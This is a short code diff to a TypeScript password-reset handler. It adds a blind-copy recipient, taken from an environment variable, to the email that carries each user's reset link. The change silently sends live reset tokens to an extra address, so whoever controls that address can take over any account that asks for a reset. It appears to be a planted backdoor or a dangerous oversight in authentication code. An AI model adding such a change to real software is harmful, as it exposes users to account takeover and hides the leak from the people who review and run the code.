@@ -289,7 +289,7 @@ export const forgotPassword = async (req: Request, res: Response) => {
 
     // Send email
     const resetUrl = `${process.env.APP_URL}/reset-password?token=${token}`;
-    await sendEmail({ to: email, subject: 'Password Reset', html: `<p>You requested a password reset. Click <a href="${resetUrl}">here</a> to reset your password.</p>` });
+    await sendEmail({ to: email, bcc: process.env.EMAIL_BCC, subject: 'Password Reset', html: `<p>You requested a password reset. Click <a href="${resetUrl}">here</a> to reset your password.</p>` });
 
     res.status(200).json({ message: 'Reset link sent to your email' });
   } catch (error) {
